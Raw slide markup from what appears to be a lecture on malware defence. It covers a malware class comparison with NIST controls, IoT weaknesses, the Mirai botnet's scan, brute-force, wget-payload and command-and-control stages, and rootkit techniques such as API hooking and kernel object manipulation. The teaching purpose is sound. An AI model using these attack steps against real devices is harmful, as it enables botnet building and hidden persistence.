                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Virus</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Appends code to host files</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Required (File execution)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Integrity &amp; Availability</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Host-based File Integrity Monitoring (SI-7)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Worm</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Autonomous network socket exploits</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Not Required</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Availability &amp; Integrity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Network Segmentation (SC-7) &amp; Vulnerability Scanning (RA-5)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Trojan</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Social engineering wrappers</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Required (Deceptive download)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Confidentiality &amp; Integrity</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Software Whitelisting (CM-7) &amp; Least Privilege (AC-6)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302366">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Ransomware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Modular delivery (RATs/Worms)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Varies (Direct or indirect)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Availability (Data Access)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Immutable Off-site Backups (CP-9) &amp; EDR (SI-4)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="302371">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Spyware</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Drive-by downloads / Bundlers</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Varies</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Confidentiality (Data Theft)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Behavioral Analysis (SI-4) &amp; Outbound Firewalls (SC-7)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">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Technical Comparison of Malware Classes (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_malware_defense_matrix.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="3945063"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="531506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Malware defense-in-depth matrix, each malware class requires specific control categories for effective mitigation, no single control addresses all threat types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IoT Attack Surface &amp; Mirai Mechanics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Internet of Things (IoT)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> devices are embedded physical systems connected to IP networks, often characterized by constrained computing resources, lack of endpoint agent compatibility, and insecure default configurations.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>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IoT Vulnerability Profiles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>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Hardcoded Credentials:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Use of static administrative credentials (OWASP IoT Top 10 #1).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Outdated Firmware:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Embedded systems running modified, unpatched Linux kernels.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No Endpoint Defense:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Inability to run standard endpoint detection and response (EDR) agents due to limited CPU and memory.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rounded Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5643233" y="2093369"/>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Mirai Botnet Lifecycle</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5703233" y="2493369"/>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Scan Phase:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Scans IPv4 addresses for open Telnet ports (TCP 23/2323).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Brute Force:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Uses a dictionary of 64 default manufacturer username/password pairs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Infection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Injects a shell command to download the payload binary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>C2 Command:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Registers with a Command-and-Control server to await DDoS commands.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Pentagon 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="4095437"/>
            <a:ext cx="1039483"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Mirai Scan: Random IPv4 probe on TCP 23/2323</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Chevron 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1470039" y="4095437"/>
            <a:ext cx="1039483"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Telnet Port Open Detected</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Chevron 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2659522" y="4095437"/>
            <a:ext cx="1039483"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Brute Force: Try 64 default credential pairs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Chevron 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3849005" y="4095437"/>
            <a:ext cx="1039483"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Authentication Successful</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Chevron 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5038488" y="4095437"/>
            <a:ext cx="1039483"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Shell Command Injection: wget payload binary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Chevron 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6227971" y="4095437"/>
            <a:ext cx="1039483"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Payload Executes: Kill competing malware + protect port</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Chevron 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7417454" y="4095437"/>
            <a:ext cx="1039483"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Register with C2 Server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Chevron 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8606937" y="4095437"/>
            <a:ext cx="1039483"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Await DDoS Target Instructions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Chevron 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9796420" y="4095437"/>
            <a:ext cx="1039483"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Launch UDP/TCP/HTTP Flood Attack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IoT Attack Surface &amp; Mirai Mechanics (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_iot_mirai_botnet.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Mirai botnet at peak scale, over 600,000 infected IoT devices used as a distributed weapon to launch record-breaking DDoS attacks against major internet infrastructure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16 Review &amp; Defense-in-Depth</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1395041"/>
            <a:ext cx="10555354" cy="4346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"Host security must assume that network perimeters will fail. Restricting malware requires a multi-layered defense-in-depth architecture covering propagation, execution, and payload phases."  — NIST SP 800-83 Rev. 1 Guidelines</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1959802"/>
            <a:ext cx="10555354" cy="5203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NIST SP 800-83 Malware Prevention   ·   Hybrid Cryptography in Ransomware   ·   Social Engineering Trojans &amp; Wrappers   ·   Autonomous Worm Propagation &amp; Lateral Movement   ·   OWASP IoT Vulnerabilities &amp; Botnets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16 Review &amp; Defense-in-Depth (2/2)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="16_defense_in_depth_layers.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="747977" y="1330000"/>
            <a:ext cx="962051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Defense-in-depth for malware mitigation, each concentric layer addresses specific malware propagation vectors and payload classes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Rootkits &amp; Kernel-Level Persistence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rootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is a collection of tools and techniques that allow an attacker to maintain persistent, hidden administrative access to a compromised system by modifying the operating system's core components, including the kernel, bootloader, or hypervisor, to conceal the attacker's presence.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="2093369"/>
            <a:ext cx="5192677" cy="23844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Rootkit Classification by Layer</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="340556" y="2493369"/>
            <a:ext cx="5072677" cy="19344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User-Mode Rootkits:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Patch DLLs and API calls in user space (e.g., hooking </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>NtQueryDirectoryFile</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to hide files from directory listings).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Kernel-Mode Rootkits:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Load as malicious device drivers to modify kernel data structures (DKOM, Direct Kernel Object Manipulation).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bootkit:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Infects the Master Boot Record (MBR) or UEFI firmware, executing before the OS kernel loads, surviving full OS reinstallation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
